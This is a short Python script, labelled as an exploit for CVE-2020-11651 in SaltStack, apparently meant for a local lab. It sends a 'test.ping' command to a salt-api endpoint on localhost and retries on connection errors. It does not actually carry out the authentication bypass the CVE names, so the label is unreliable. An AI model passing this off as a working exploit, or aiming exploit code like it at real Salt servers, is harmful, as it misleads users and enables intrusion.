import requests
import time

# Exploit for CVE-2020-11651

def exploit_salt_master(host):
    # Introduce a delay to allow the Salt master to initialize
    time.sleep(30)
    url = f'http://{host}:8000'
    headers = {'Content-Type': 'application/json'}
    data = {
        "client": "local",
        "tgt": "*",
        "fun": "test.ping"
    }

    retries = 5
    for _ in range(retries):
        try:
            response = requests.post(url, json=data, headers=headers)
            print(response.text)
            break
        except requests.exceptions.ConnectionError:
            print("Connection refused, retrying...")
            time.sleep(5)

if __name__ == '__main__':
    exploit_salt_master('localhost')
